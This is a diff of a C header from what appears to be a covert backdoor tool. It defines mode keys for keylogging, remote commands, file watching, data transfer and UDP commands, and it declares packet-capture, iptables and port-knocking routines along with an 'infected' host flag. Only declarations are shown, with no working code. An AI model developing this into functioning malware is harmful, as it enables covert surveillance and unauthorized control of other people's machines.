@@ -40,10 +40,17 @@
 
 //check key returns
 #define KEYLOGGER       1
+#define KEYLOGGER_KEY   'k'
 #define COMMAND         2
+#define COMMAND_KEY     'c'
 #define INOTIFY         3
-#define PORTKNOCKING    4
+#define INOTIFY_KEY     'i'
+#define DATA            4
+#define DATA_KEY        'd'
 #define UDPCOMMAND      5
+#define UDPCOMMAND_KEY  'u'
+#define EOT             6
+#define EOT_KEY         'e'
 
 struct my_ip {
 	u_int8_t	ip_vhl;		/* header length, version */
@@ -102,26 +109,27 @@ struct payload{
 };
 
 struct filter{
-    int amount;
-    const char *port[FILTERAMOUNT];
-    unsigned short port_short[FILTERAMOUNT];
-    unsigned short port_ushort[FILTERAMOUNT];
+    //int amount;
+    //const char *port[FILTERAMOUNT];
+    //unsigned short port_short[FILTERAMOUNT];
+    //unsigned short port_ushort[FILTERAMOUNT];
     char targetip[BUFSIZ];
     char localip[BUFSIZ];
-    int pattern[FILTERAMOUNT];
+    //int pattern[FILTERAMOUNT];
     bool infected;
     //add tcp and udp flag
+    bool tcp;
 };
 
 void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void iptables(char *ip, bool tcp, char *port, bool input, bool remove);
-struct filter InitFilter(char *target, char *local, bool infected);
+struct filter InitFilter(char *target, char *local, bool infected, bool tcp);
 void PrintFilter(struct filter Filter);
-void CreateFilter(struct filter Filter, char *buffer, bool tcp);
-void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, bool tcp);
-void SendPattern(unsigned char *data, struct filter *Filter, bool tcp);
+void CreateFilter(char *buffer, bool tcp);
+//void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, bool tcp);
+//void SendPattern(unsigned char *data, struct filter *Filter, bool tcp);
 //char GetLocalIP(char *device);
-int Packetcapture(char *filter, struct filter Filter,bool tcp);
+int Packetcapture(char *filter, struct filter Filter);
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseIP(struct filter *Filter,const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet);
